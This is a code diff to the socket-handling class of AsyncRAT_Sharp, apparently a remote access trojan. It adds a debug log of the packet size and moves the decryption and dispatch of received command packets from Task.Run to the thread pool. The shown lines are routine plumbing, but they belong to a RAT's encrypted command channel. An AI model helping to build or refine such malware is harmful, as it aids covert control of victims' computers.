@@ -7,6 +7,8 @@ using AsyncRAT_Sharp.Handle_Packet;
 using System.Threading.Tasks;
 using System.Security.Cryptography;
 using System.Drawing;
+using System.Diagnostics;
+using System.Threading;
 
 namespace AsyncRAT_Sharp.Sockets
 {
@@ -65,6 +67,7 @@ namespace AsyncRAT_Sharp.Sockets
                                 if (Buffersize > 0)
                                 {
                                     Buffer = new byte[Buffersize];
+                                    Debug.WriteLine("///  Buffersize: " + Buffersize.ToString() + " Bytes  ///");
                                     BufferRecevied = true;
                                 }
                             }
@@ -75,11 +78,9 @@ namespace AsyncRAT_Sharp.Sockets
                             await MS.WriteAsync(Buffer, 0, Recevied);
                             if (MS.Length == Buffersize)
                             {
-                                await Task.Run(() =>
-                                {
                                     try
                                     {
-                                        HandlePacket.Read(this, Settings.aes256.Decrypt(MS.ToArray()));
+                                    ThreadPool.QueueUserWorkItem(HandlePacket.Read, new object[] { Settings.aes256.Decrypt(MS.ToArray()), this });
                                     }
                                     catch (CryptographicException)
                                     {
@@ -94,7 +95,6 @@ namespace AsyncRAT_Sharp.Sockets
                                     MS.Dispose();
                                     MS = new MemoryStream();
                                     BufferRecevied = false;
-                                });
                             }
                             else
                                 Buffer = new byte[Buffersize - MS.Length];
